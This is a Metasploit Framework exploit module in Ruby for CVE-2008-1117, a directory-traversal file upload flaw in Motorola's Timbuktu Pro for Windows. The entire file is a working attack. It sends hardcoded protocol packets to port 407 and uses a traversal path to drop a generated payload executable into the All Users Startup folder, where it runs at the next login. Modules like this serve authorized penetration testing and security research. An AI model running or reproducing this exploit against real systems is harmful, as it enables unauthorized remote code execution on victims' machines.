##
# $Id: timbuktu_fileupload.rb 11127 2010-11-24 19:35:38Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::EXE

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Timbuktu Pro Directory Traversal/File Upload',
			'Description'    => %q{
				This module exploits a directory traversal vulnerablity in Motorola's
				Timbuktu Pro for Windows 8.6.5.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 11127 $',
			'References'     =>
				[
					[ 'CVE', '2008-1117' ],
					[ 'OSVDB', '43544' ],
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 2048,
					'DisableNops' => true,
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic',  { } ],
				],
			'DefaultTarget' => 0,
			'DisclosureDate' => 'May 10 2008'))

		register_options(
			[
				Opt::RPORT(407),
				OptString.new('PATH', [ true, 'The path to place the executable.', '\\../../../Documents and Settings/All Users/Start Menu/Programs/Startup/']),
			], self.class)
	end

	def exploit
		connect

		exe  = rand_text_alpha(8) + ".exe"
		data = generate_payload_exe

		pkt1 =  "\x00\x01\x6B\x00\x00\xB0\x00\x23\x07\x22\x03\x07\xD6\x69\x6D\x3B"
		pkt1 << "\x27\xA8\xD0\xF2\xD6\x69\x6D\x3B\x27\xA8\xD0\xF2\x00\x09\x01\x41"
		pkt1 << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		pkt1 << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		pkt1 << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		pkt1 << "\x00\x00\x00\x00\x00\x00\x01\x97\x01\x41\x00\x00\x00\x00\x00\x00"
		pkt1 << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		pkt1 << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		pkt1 << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		pkt1 << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x04\xB7\x1D"
		pkt1 << "\xBF\x42\x00\x00\x00\x00\x7F\x00\x00\x01\x00\x00\x00\x00\x00\x00"
		pkt1 << "\x00\x00\x00\x00\x00\x00"

		pkt3 =  "\xFB\x00\x00\x00\x00\x54\x45\x58\x54\x74\x74\x78\x74\xC2\x32\x94"
		pkt3 << "\xCC\xC2\x32\x94\xD9\x00\x00\x00\x00\x00\x00\x00\x13\x00\x00\x00"
		pkt3 << "\x00\xFF\xFF\xFF\xFF\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		pkt3 << "\x00\x00\x00\x00\x00\x00\x00"
		pkt3 << [datastore['PATH'].length + exe.length].pack('C') + datastore['PATH'] + exe

		print_status("Connecting to #{rhost} on port #{rport}...")

		sock.put(pkt1)
		select(nil,nil,nil,0.15)

		sock.put("\xFF")
		select(nil,nil,nil,0.15)

		sock.put(pkt3)
		select(nil,nil,nil,0.15)

		sock.put("\xF9\x00")
		select(nil,nil,nil,0.15)

		print_status("Sending EXE payload '#{exe}' to #{rhost}:#{rport}...")
		sock.put("\xF8" + [data.length].pack('n') + data)
		select(nil,nil,nil,5)

		sock.put("\xF7")
		select(nil,nil,nil,0.15)

		sock.put("\xFA")
		select(nil,nil,nil,0.15)

		sock.put("\xFE")
		select(nil,nil,nil,0.08)

		print_status("Done!")
		disconnect

	end
end
